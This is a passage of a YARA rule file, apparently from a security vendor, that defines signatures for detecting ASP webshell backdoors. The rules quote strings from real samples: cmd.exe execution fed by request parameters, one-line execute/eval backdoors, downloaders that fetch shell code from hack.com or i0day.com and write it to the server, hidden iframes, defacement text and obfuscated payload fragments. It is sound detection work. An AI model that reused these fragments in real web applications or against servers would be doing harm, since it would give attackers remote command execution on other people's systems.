        $s3 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com&gt;</title>\"" fullword ascii
        $s4 = "Response.Write \"<tr><td><b><font color=red>Log Root</td><td> \" & request.servervariables(\"APPL_MD_PATH\") & \"</td></tr>\"" fullword ascii
        $s5 = "Response.Write \"<form method=get action='\"&DosyPath&\"' target='_opener' id=form1 name=form1>\"" fullword ascii
        $s6 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Fil.name" fullword ascii
        $s7 = "objConn.Execute strSQL" fullword ascii
        $s8 = "Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)" fullword ascii
        $s9 = "Response.Write \"<form method=get target='_opener' action='\"&DosyPath&\"'>\"" fullword ascii
        $s10 = "response.Write \"<iframe style='width:0; height:0' src='http://localhost/tuzla-ebelediye'></iframe>\"" fullword ascii
        $s11 = "Response.Write \"<tr><td><b><font color=red>HTTPD</td><td> \" & request.servervariables(\"SERVER_SOFTWARE\") & \"</td></tr>\"" fullword ascii
        $s12 = "Response.Write \"<tr><td><b><font color=red>Port</td><td> \" & request.servervariables(\"SERVER_PORT\") & \"</td></tr>\"" fullword ascii
        $s13 = "Call Err.Raise(vbObjectError + 1, \"clsUpload.asp\", \"Object does not exist within the ordinal reference.\")" fullword ascii
        $s14 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Type:\"), vbTextCompare)" fullword ascii
        $s15 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Disposition:\"), vbTextCompare)" fullword ascii
        $s16 = "Response.Write \"<tr><td><b><font color=red>HTTPS</td><td> \" & request.servervariables(\"HTTPS\") & \"</td></tr>\"" fullword ascii
        $s17 = "Response.Write \"<tr><td><b>Local Path </td><td><font color=red>yazma yetkisi yok! : [\"&err.Description&\"]</td></tr>\"" fullword ascii
        $s18 = "<input style=\"width:100%\" type=text name=\"FileName\" id=\"FileName\" value=\"byzehir.txt\" size=\"20\"></td" fullword ascii
        $s19 = "<input style=\"width:100%\" type=text name=\"FileName\" id=\"FileName\" value=\"byzehir.txt\" size=\"20\"></td>" fullword ascii
        $s20 = "MyFile.write \"byzehir <zehirhacker@hotmail.com>\"" fullword ascii
     condition:
        ( uint16(0) == 0x3c0a and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_7cca741dc2c1730e62e37ad2bd7142ac03c7e2f9
{
     meta:
        description = "asp - file 7cca741dc2c1730e62e37ad2bd7142ac03c7e2f9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5d80777dc6f46915f792a7d30206fe10a99893bba8630f61ee017f9fd0f0212d"
     strings:
        $s1 = "<%_()(_(!-''));function _(__){if(__){return Request('_')+''}else{return  eval" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule e6ad72172f90b22085f19c88d09dfe148926d75b
{
     meta:
        description = "asp - file e6ad72172f90b22085f19c88d09dfe148926d75b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "80250e9c13eba2ed0341112f9321a10c31278c21c2d82a9d1229b919face0972"
     strings:
        $x1 = "Set ijre=zsckm.ExecQuery(\"select * from Win32_Pro\"&ivj&\"cess where ProcessId='\"&pid&\"'\")" fullword ascii
        $x2 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii
        $x3 = "Set rrf=zsckm.ExecQuery(\"select * from Win32_NetworkAda\"&dkp&\"pterConfiguration where IPEnabled ='True'\")" fullword ascii
        $x4 = "Set qxau=zsckm.ExecQuery(\"select * from Win3\"&dwt&\"2_Service where Name='\"&dlzu&\"'\")" fullword ascii
        $x5 = "bdyaf=bdyaf&\"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>\"" fullword ascii
        $x6 = "bdyaf=bdyaf&\"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | \"" fullword ascii
        $s7 = "zepw\"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\",\"Start Menu->Programs\"" fullword ascii
        $s8 = "On Error Resume Next:Execute nedsl&\".\"&strPam&\".value=rsdx(\"&nedsl&\".\"&strPam&\".value)\"" fullword ascii
        $s9 = "zhv\"com\"&sruz&\"mand execute succeed!Refresh the iframe below to check result.\"" fullword ascii
        $s10 = "Set mgl=blhvq.Execute(str)" fullword ascii
        $s11 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii
        $s12 = "zepw\"C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\",\"PcAnywhere\"" fullword ascii
        $s13 = "zepw\"C:\\Documents and Settings\\All Users\\Documents\",\"Documents\"" fullword ascii
        $s14 = "bdyaf=bdyaf&\"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | \"" fullword ascii
        $s15 = "bdyaf=bdyaf&\"<a href='http://www.vtwo.cn/' target='_blank'>Bink Team</a> | \"" fullword ascii
        $s16 = "zepw\"C:\\Documents and Settings\\All Users\",\"All Users\"" fullword ascii
        $s17 = "doTd\"<a href=\"\"javascript:adwba('\"&goaction&\"','stopone','\"&cpmvi.ProcessId&\"')\"\">Terminate</a>\",\"\"" fullword ascii
        $s18 = "zepw\"C:\\Program Files\\RhinoSoft.com\",\"RhinoSoft.com\"" fullword ascii
        $s19 = "Set bnes=dtwz(\"wi\"&kcb&\"nmgmts:\\\\.\\ro\"&todxo&\"ot\\default:StdRegP\"&bqlnw&\"rov\")" fullword ascii
        $s20 = "echo\"<div align=right>Processed in :\"&apwc&\"seconds</div></td></tr></table></body></html>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_8c729d23863ff2fb83a657a66875df833e4b453d
{
     meta:
        description = "asp - file 8c729d23863ff2fb83a657a66875df833e4b453d.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "610bcbad530fa620e70620a7c751445164169eb6b62d2d472e208644aec7251a"
     strings:
        $x1 = "Set Pipe = WShell.Exec(\"%comspec% /c \" & sCommand & \" 2>&1\")" fullword ascii
        $x2 = "RetCode = WShell.Run(\"%comspec% /c \" & sCommand & \" 2>&1\", 0, False)" fullword ascii
        $x3 = "\"Enter the password: <form  name='download' action='\" & sURL & \"' method='POST'>\"  & _" fullword ascii
        $s4 = "document.download.DL.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + '\\\\' + file_name;" fullword ascii
        $s5 = "' Executes command and passes stdout to browser." fullword ascii
        $s6 = "document.download.DL.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + file_name;" fullword ascii
        $s7 = "Private Sub ExecuteCmd(ByVal sCommand, ByVal bBg)" fullword ascii
        $s8 = "document.items.DEL.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + '\\\\' + item_name;" fullword ascii
        $s9 = "document.items.DEL.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + item_name;" fullword ascii
        $s10 = "document.path.DIR.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + '\\\\' + dir_name;" fullword ascii
        $s11 = "document.path.DIR.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + dir_name;" fullword ascii
        $s12 = "<tr><td>PROCESSOR_IDENTIFIER</td><td><%= EmptyToNbsp(WEnv(\"PROCESSOR_IDENTIFIER\")) %></td></tr>" fullword ascii
        $s13 = "<tr><td>PROCESSOR_VERSION</td><td><%= EmptyToNbsp(WEnv(\"PROCESSOR_VERSION\")) %></td></tr>" fullword ascii
        $s14 = "document.path.DIR.value = '<%= Replace(FSO.GetFolder(GetCorrectPath(sDir)).ParentFolder.Path, \"\\\", \"\\\\\") %>';" fullword ascii
        $s15 = "<tr><td>PROCESSOR_ARCHITECTURE</td><td><%= WEnv(\"PROCESSOR_ARCHITECTURE\") %></td></tr>" fullword ascii
        $s16 = "<option value=\"REG_BINARY\" <%If ( sKeyType = \"REG_BINARY\" ) Then Response.Write(\"selected\") End If%>>REG_BINARY</option>" fullword ascii
        $s17 = "nStartPos = InStrB(nEndPos, BinData, CStrB(\"Content-Type:\"))" fullword ascii
        $s18 = "<tr><td>PROCESSOR_LEVEL</td><td><%= EmptyToNbsp(WEnv(\"PROCESSOR_LEVEL\")) %></td></tr>" fullword ascii
        $s19 = "Response.Write( \"Error: '\" & Err.Description & \"' at \" & Err.Source & \" [\" & Err.Number & \"]\" )" fullword ascii
        $s20 = "<tr><td>NUMBER_OF_PROCESSORS</td><td><%= WEnv(\"NUMBER_OF_PROCESSORS\") %></td></tr>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule cfc4bf95c993bce745a6597473146372b4e31970
{
     meta:
        description = "asp - file cfc4bf95c993bce745a6597473146372b4e31970.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
     strings:
        $x1 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
        $x2 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x3 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
        $s4 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'><b>->" fullword ascii
        $s5 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=hiddenshell' target='FileFrame'><b>->" fullword ascii
        $s6 = "Report = Report&\"<tr><td height=30>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s7 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s8 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>->" fullword ascii
        $s9 = "Conn.Execute(SqlStr)" fullword ascii
        $s10 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
        $s11 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
        $s12 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>" fullword ascii
        $s13 = "RRS\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&urL&\"\"\" target=\"\"FileFrame\"\">\":" fullword ascii
        $s14 = "</a></div></td></tr>\"::RRS\"<tr><td height='22'><a href='?Action=Logout' target='_top'>->" fullword ascii
        $s15 = "if addcode=\"\" then addcode=\"<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>\"" fullword ascii
        $s16 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>C:\\\\RECYCLER</a>" fullword ascii
        $s17 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>->" fullword ascii
        $s18 = "</a></td></tr>\":End If::RRS\"<tr><td height='22'><a href='?Action=UpFile' target='FileFrame'>->" fullword ascii
        $s19 = ")</a></b></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>->" fullword ascii
        $s20 = "\",\"\",1,1,1),\"\\\",\"/\"))&\"\"\" target=_blank>\"&replace(FilePath,server.MapPath(\"\\\")&\"\\\",\"\",1,1,1)&\"</a><br />\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_2b2e70079bf3bf513fe1ea631b49e49701642fa4
{
     meta:
        description = "asp - file 2b2e70079bf3bf513fe1ea631b49e49701642fa4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f6c7bef8230bc4d37e8ce1b2e9664f60b22dafaee11bf143b0af96d769455c59"
     strings:
        $x1 = "si=si&\"<form method=post action='http://www.ip138.com/index.asp' name='ipform' target='_blank'><tr align='center'><td height='" fullword ascii
        $s2 = "si=si&\"<a href='http://www.blackbap.com/' target='_blank'>Silic Group</a>\"" fullword ascii
        $s3 = "si=si&\"<a href='?action=cmdshell' target='fileframe'>" fullword ascii
        $s4 = "</td><td bgcolor='#ffffff'>&nbsp;</td><td bgcolor='#ffffff'>\"&request.servervariables(\"number_of_processors\")&\"</td></tr>\"" fullword ascii
        $s5 = "si=si&\"<a href='javascript:fullform(\"\"\"&repath(session(\"folderpath\")&\"\\data.mdb\")&\"\"\",\"\"compactmdb\"\")'>" fullword ascii
        $s6 = "si=\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&url&\"\"\" target=\"\"fileframe\"\">\"" fullword ascii
        $s7 = "c.compactdatabase \"provider=microsoft.jet.oledb.4.0;data source=\"&path&\",provider=microsoft.jet.oledb.4.0;data source=\" &p" fullword ascii
        $s8 = "response.addheader \"content-disposition\", \"attachment; filename=\" & mid(path,sz)" fullword ascii
        $s9 = "si=si&\"<a href='javascript:fullform(\"\"\"&repath(session(\"folderpath\")&\"\\new.mdb\")&\"\"\",\"\"createmdb\"\")'>" fullword ascii
        $s10 = "conn.execute(sqlstr)" fullword ascii
        $s11 = "si=si&\"<form method=post action='http://www.ip138.com/index.asp' name='ipform' target='_blank'><tr align='center'><td height='2" ascii
        $s12 = "<%sztempfile = server.mappath(\"cmd.txt\")" fullword ascii
        $s13 = "si=\"<form method='post'><input name='cmd' style='width:92%' class='cmd' value='\"&defcmd&\"'><input type='submit' value='" fullword ascii
        $s14 = "si=si&\"<a href='?action=serverinfo' target='fileframe'>" fullword ascii
        $s15 = "si=si&\"<a href='?action=logout' target='_top'>" fullword ascii
        $s16 = "str[2] = \"driver={mysql};server=<%=serverip%>;port=3306;database=dbname;uid=root;pwd=****\";" fullword ascii
        $s17 = "si=si&\"<form name='addrform' method='post' action='\"&url&\"' target='_parent'>\"" fullword ascii
        $s18 = "si=si&\"<a href='javascript:fullform(\"\"\"&repath(session(\"folderpath\")&\"\\newfolder\")&\"\"\",\"\"newfolder\"\")'>" fullword ascii
        $s19 = "si=si&\"<form name='upform' method='post' action='\"&url&\"?action=upfile&action2=post' enctype='multipart/form-data'>\"" fullword ascii
        $s20 = "si=si&\"<a href='javascript:fullsqlstr(\"\"select * from [\"&tname&\"]\"\",1)'>\"&tname&\"</a></td>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_73c135f349bb48b22f13365782644b377b42c26b
{
     meta:
        description = "asp - file 73c135f349bb48b22f13365782644b377b42c26b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8e51b21fc79dd9e35be249baa71cffc451328361e907c62c2813c3f7524e3abe"
     strings:
        $x1 = "sGet.SaveToFile \"D:\\website\\jingsheng\\Templates\\heise\\html\\shell.asp\",2  " fullword ascii
        $s2 = "xPost.Open \"GET\",\"http://hack.com/shell.txt\",0" fullword ascii
        $s3 = "Set xPost = createObject(\"Microsoft.XMLHTTP\")" fullword ascii
        $s4 = "sGet.Write(xPost.responseBody)" fullword ascii
        $s5 = "Set sGet = createObject(\"ADODB.Stream\")" fullword ascii
        $s6 = "sGet.Type = 1" fullword ascii
        $s7 = "sGet.Mode = 3" fullword ascii
        $s8 = "sGet.Open()" fullword ascii
        $s9 = "xPost.Send()" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_8d169ff9472af99c27968f60e947833c1bdbf49d
{
     meta:
        description = "asp - file 8d169ff9472af99c27968f60e947833c1bdbf49d.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7ee19fdb4bd4ee89f391b075b2d9a17f20ff4c2fc40799c4ca33e4bde78c4a53"
     strings:
        $s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii
        $s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii
        $s3 = "Set xPost = CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii
        $s4 = "sGet.Write(xPost.responseBody)" fullword ascii
        $s5 = "Set sGet = CreateObject(\"ADODB.Stream\")" fullword ascii
        $s6 = "sGet.Type = 1" fullword ascii
        $s7 = "sGet.Mode = 3" fullword ascii
        $s8 = "sGet.Open()" fullword ascii
        $s9 = "xPost.Send()" fullword ascii
        $s10 = "set sGet = nothing" fullword ascii
        $s11 = "set sPOST = nothing" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( 8 of them ) ) or ( all of them )
}

rule c624cd29ebe31b707b6a593299de6f5b78e661e8
{
     meta:
        description = "asp - file c624cd29ebe31b707b6a593299de6f5b78e661e8.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
     strings:
        $x1 = "j oScriptlhn.exec(\"cmd.exe /c\"&request(\"cmd\")).stdout.readall " fullword ascii
        $x2 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
        $x3 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&domain&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x4 = "j cdx&\"<a href='http://odayexp.com/h4cker/gx/' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x5 = "end if :j oScriptlhn.exec(request(\"cmdx\")&\" /c\"&request(\"cmd\")).stdout.readall :j(\"</textarea></center>\")" fullword ascii
        $x6 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x7 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
        $s8 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $s9 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s10 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
        $s11 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s12 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s13 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s14 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
        $s15 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
        $s16 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
        $s17 = "i=i+1:Next:copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39" ascii
        $s18 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
        $s19 = "<a style=\"\"text-decoration:underline;font-weight:bold\"\" href=\"&URL&\"?ProFile=\"&pass2&\" target=_blank>" fullword ascii
        $s20 = "t:if request(\"cmdx\")=\"cmd.exe\" then" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule dec92a777b3d9b99b54baa4cee50e70a607f14ad
{
     meta:
        description = "asp - file dec92a777b3d9b99b54baa4cee50e70a607f14ad.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "973380a7b625373cb584c49cf1feeb85e3aaa7bede076d97a5edcf86b35fe13f"
     strings:
        $s1 = "sGet.SaveToFile Server.MapPath(\"1.asp\"),2" fullword ascii
        $s2 = "Set xPost = CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii
        $s3 = "sGet.Write(xPost.responseBody)" fullword ascii
        $s4 = "Set sGet = CreateObject(\"ADODB.Stream\")" fullword ascii
        $s5 = "xPost.Open \"GET\",\"" fullword ascii
        $s6 = "sGet.Type = 1" fullword ascii
        $s7 = "sGet.Mode = 3" fullword ascii
        $s8 = "sGet.Open()" fullword ascii
        $s9 = "xPost.Send()" fullword ascii
        $s10 = "set sGet = nothing" fullword ascii
        $s11 = "set sPOST = nothing" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( 8 of them ) ) or ( all of them )
}

rule a6ab3695e46cd65610edb3c7780495d03a72c43d
{
     meta:
        description = "asp - file a6ab3695e46cd65610edb3c7780495d03a72c43d.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "53346253fef1d655c844c914a6535fed1d82b98b45ceb27ff39e37a54f55a49a"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
        $x2 = "HeaderContent = MidB(Binary, PosOpenBoundary + LenB(Boundary) + 2, PosEndOfHeader - PosOpenBoundary - LenB(Boundary) - 2)" fullword ascii
        $x3 = "bFieldContent = MidB(Binary, (PosEndOfHeader + 4), PosCloseBoundary - (PosEndOfHeader + 4) - 2)" fullword ascii
        $s4 = "GetHeadFields BinaryToString(HeaderContent), Content_Disposition, FormFieldName, SourceFileName, Content_Type" fullword ascii
        $s5 = "Content_Disposition = LTrim(SeparateField(Head, \"content-disposition:\", \";\"))" fullword ascii
        $s6 = "<b>User</b>: <%= \"\\\\\" & oScriptNet.ComputerName & \" \\ \" & oScriptNet.UserName %> <br>" fullword ascii
        $s7 = "Content_Type = LTrim(SeparateField(Head, \"content-type:\", \";\"))" fullword ascii
        $s8 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
        $s9 = "Function GetHeadFields(ByVal Head, Content_Disposition, Name, FileName, Content_Type)" fullword ascii
        $s10 = "response.write(\"<form name=frmFileAttributes action=elmaliseker.asp method=post>\")" fullword ascii
        $s11 = "response.write(\"<form name=frmFolderAttributes action=elmaliseker.asp method=post>\")" fullword ascii
        $s12 = "<b>HTTPD</b>: <%=request.servervariables(\"SERVER_SOFTWARE\")%> <b>Port</b>: <%=request.servervariables(\"SERVER_PORT\")%> <br>" fullword ascii
        $s13 = "PosEndOfHeader = InStrB(PosOpenBoundary + Len(Boundary), Binary, StringToBinary(vbCrLf + vbCrLf))" fullword ascii
        $s14 = "response.write(\"<form name=lstFolders action=elmaliseker.asp method=post>\")" fullword ascii
        $s15 = "response.write(\"<form name=frmTextFile action=elmaliseker.asp method=post>\")" fullword ascii
        $s16 = "response.write(\"<form name=lstFiles action=elmaliseker.asp method=post>\")" fullword ascii
        $s17 = "response.write(\"<form name=lstDrives action=elmaliseker.asp method=post>\")" fullword ascii
        $s18 = "response.write(\"File: \" & FilePath & \" Format: \" & tempmsg & \" has been saved.\")" fullword ascii
        $s19 = "<b>User Agent</b>: <%=request.servervariables(\"HTTP_USER_AGENT\")%> <br>" fullword ascii
        $s20 = "alue=DeleteFolder><br><input type=submit name=cmdOption Value=CopyFolder> to <input type=text name=CopyFolderTo></td></tr>\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule f32ad501318fde95c1d59704e979c079d92715a6
{
     meta:
        description = "asp - file f32ad501318fde95c1d59704e979c079d92715a6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e8e04e34ae5a3ad9b22ffb05993ee0f372c6b17e6ddafcb136c4f82fc909b8ac"
     strings:
        $s1 = ";<%execute request(\"cmd\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x4947 and filesize < 30KB and ( all of them ) ) or ( all of them )
}

rule sig_17f9a41689a526050ba7eeb326b50b4770036256
{
     meta:
        description = "asp - file 17f9a41689a526050ba7eeb326b50b4770036256.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "99a4924b8ba4933552271332485008f13d73f9d89526c03a200c8b6a794af4e5"
     strings:
        $s1 = "#37;\"),\"(\",\"[\"),\")\",\"]\"),\"/\",\"&#47;\"),\"'\",\"&#39;\"),\"\"\"\",\"&#34;\")" fullword ascii /* hex encoded string '7G94' */
        $s2 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" />" fullword ascii
        $s3 = "<textarea rows=\"5\" id=\"what\" style=\"font-family:Times New Roman;font-size:14pt;\" cols=\"80\" name=\"what\">" fullword ascii
        $s4 = "uip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")" fullword ascii
        $s5 = "<p><a href=\"#img\" onclick=\"document.getElementById('what').value+='[img]" fullword ascii
        $s6 = "server.scripttimeout=120" fullword ascii
        $s7 = "<p class=\"tx\">Chating Room is Powered By <a href=\"http://blackbap.org\" target=\"_blank\">Silic Group Hacker Army</a>&copy;20" ascii
        $s8 = "<p class=\"tx\">Chating Room is Powered By <a href=\"http://blackbap.org\" target=\"_blank\">Silic Group Hacker Army</a>&copy;20" ascii
        $s9 = "If uip = \"\" Then uip = Request.ServerVariables(\"REMOTE_ADDR\")" fullword ascii
        $s10 = "Set Fs=Server.CreateObject(\"Scripting.FileSystemObject\") " fullword ascii
        $s11 = "<a style=\"letter-spacing:3px;\"><b>Hacked! Owned by Chinese Hackers!</b><br></a>" fullword ascii
        $s12 = ">>> Fucked at:\"&tm&\"</p></pre>\"" fullword ascii
        $s13 = "response.write \"<script>location.replace(location.href);</script>\"" fullword ascii
        $s14 = "data = replace(data,\"[img]\",\"<img src=\"\"http://\")" fullword ascii
        $s15 = "pre{font-size:15pt;font-family:Times New Roman;line-height:120%;}" fullword ascii
        $s16 = "<form method=post action=\"?\">" fullword ascii
        $s17 = "ff = Request.ServerVariables(\"SCRIPT_NAME\")" fullword ascii
     condition:
        ( uint16(0) == 0x213c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_86b73fb74aa7ab1660bb7ce5f27099b44d29386b
{
     meta:
        description = "asp - file 86b73fb74aa7ab1660bb7ce5f27099b44d29386b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d1f80e42556d4ec83f707870783af2f284d798e531007dfe338c9967b4943e02"
     strings:
        $s1 = "vY;l,&Om]!*F+0m]!*W!9{Y;F,o!u+ u +YyZsHCs+Y OY2AOKwctk9+6GDsRo1m:n 7lV!n]y!_uf9]y!u +]++uG/]F/]FZY{;] +Yy QfgCs+Y2AuGf" fullword ascii
        $s2 = "RZF~ 2FP *2P c2~c%f,RlFF,RlqF,R{,,R+q8PRWqF,RFZq~RlF8P Gqq,R0&, c2P q+PR+q8P %2~ccf,RR&PcG8qPc%fPccf~cFv, G8FPcf" fullword ascii
        $s3 = "[E@!&WKxO@*@!&0KxO@*@!zmnUD+.@*@!4MP^KVKD'[cy* W ~/bynx8P@*rlI\"?J@!&ON@*@!JY.@*El&0~r(P`Z~qb{JP" fullword ascii
        $s4 = "PW(%o0@#@&,P~PdOMss1mh+{rUnwkVn glh+@#@&,P~,q6P/DDws1m:n@!@*J[nk3YK2Rbxkr~3pjPkY.ssHm:n@!@*E0KV[nMRtOOrPPt" fullword ascii
        $s5 = "X{JPLP78mMVW@#@&VnC7+/,xP^+l7ndPLPrOj2PiU2]?APjhJ~',\\4^.^0~[,E qK{!c!RZRZEPLP-41DsW,[PrRnKDYgGxJ,[,Y2W.O,[~\\(^D^0~',JOid" fullword ascii
        $s6 = "~f(HCxmon.v#@#@&~PU;VUO.':Db:cIn5!+dYcoWM:cEU;VjOMJb#@#@&,P9(?DD'\"+$;+kY sKDhcrf4UODr#@#@&~~?&'Uq'J@!Om4s+,Ak9Y4xEv*Tv,P8WM[" fullword ascii
        $s7 = "[O2@#@&KyRKGkkYbGx,'PZ~lP: cKzwn~{P+@#@&P cZ4CM/+O~{JL4yf8 E@#@&Us.,',P cInl9KnaD@#@&:+R;VWkn@#@&b0,fqR3ab/O/viwglhn*PY4n" fullword ascii
        $s8 = "PJV2:E~,J4YDwl&JF F !c!R8lEPLPaW.Y~',J&oKsNkEU&!wl[hbx&/8EBK.!+BPJr~,EJ@#@&CRk+U[,VWTrx!/+M~'P^WTkUwCdkP'PsOPLP[n^NWhCbx~[,U" fullword ascii
